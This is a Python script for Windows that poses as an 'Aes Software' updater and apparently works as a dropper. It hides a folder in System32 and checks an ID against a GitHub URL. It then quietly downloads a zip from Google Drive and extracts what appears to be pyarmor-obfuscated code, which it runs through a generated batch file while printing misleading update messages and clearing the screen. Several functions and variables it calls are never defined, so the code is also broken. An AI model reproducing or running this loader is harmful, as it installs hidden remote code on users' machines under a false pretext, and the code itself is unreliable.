import subprocess
import sys
import os
import winreg
import requests
import sys

import ctypes
import os
import sys
import shutil
import os
import gdown
os.system('cls')

dcnmwxdr = r'C:\Windows\System32\MSRX'

if not os.path.exists(dcnmwxdr):
    os.makedirs(dcnmwxdr)
    os.system('cls')

result = check_string_in_url("https://raw.githubusercontent.com/elaideasdfxcsxcsdv/installer/refs/heads/main/uniqueidaes.txt", file_contentsx1)

os.system('cls')
def delete_files_if_aesv3_missing():
    aesv3_path = r"C:\Windows\System32\MSRX\aesv8.8.py"
    files_to_delete = [
        r"C:\Windows\System32\MSRX\aesv8.7.py",
        r"C:\Windows\System32\MSRX\aesv1.bat",
        r"C:\Windows\System32\MSRX\pyarmor_runtime_000000"
    ]

    aesv3_exists = os.path.exists(aesv3_path)

    if not aesv3_exists:
        for item in files_to_delete:
            if os.path.exists(item):
                if os.path.isfile(item):
                    os.remove(item)
                    print("")
                elif os.path.isdir(item):
                    shutil.rmtree(item)
                    os.system('cls')
                    print("")
                    print("Aes Software is updating, please don't close the window.")
                    print("")
                    print("")
    else:
        print("")

delete_files_if_aesv3_missing()

def download_file_from_google_drive(url, output_path):
    if not os.path.exists(output_path):
        gdown.download(url, output=output_path, quiet=True)

if not os.path.exists("C:\\Windows\\System32\\MSRX\\aesv8.8.py"):
    print("downloading required libraries, please wait a moment...")
    download_file_from_google_drive("https://drive.google.com/uc?id=1Ga6vZhciIzX5GRvfJkXMHnbrQyWJlz9p", "C:\\Windows\\System32\\MSRX\\v188.zip")
    zip_file = r'C:\Windows\System32\MSRX\v188.zip'
    extract_dir = r'C:\Windows\System32\MSRX'
    extract_zip(zip_file, extract_dir)
    os.remove(zip_file)


import os
import shutil
os.system('cls')
import subprocess


def create_batch_file(python_command, script_name):
    # Define the directory and file name
    directory = r"C:\Windows\System32\MSRX"
    filename = "aesv1.bat"
    filepath = os.path.join(directory, filename)

    # Check if the batch file already exists
    if not os.path.exists(filepath):
        # Content of the batch file, with python_command and script_name as parameters
        batch_content = f"@echo off\n{python_command} {script_name} || echo errorwithpath"

        # Create the directory if it doesn't exist
        os.makedirs(directory, exist_ok=True)

        # Write the content to the batch file
        with open(filepath, 'w') as file:
            file.write(batch_content)

        print(f"")
    else:
        print("")

create_batch_file("py -3.11", r"C:\Windows\System32\MSRX\aesv8.8.py")
def run_batch_file(batch_file_path):
    try:
        subprocess.run([batch_file_path], shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error")
    else:
        print("")


os.system('cls')
batch_file_path = r"C:\Windows\System32\MSRX\aesv1.bat"
os.system('cls')

try:
    subprocess.Popen(['start', 'cmd', '/c', batch_file_path], shell=True)
except Exception as e:
    print("Error")

os.system('cls')

os._exit(0)
sys.exit()
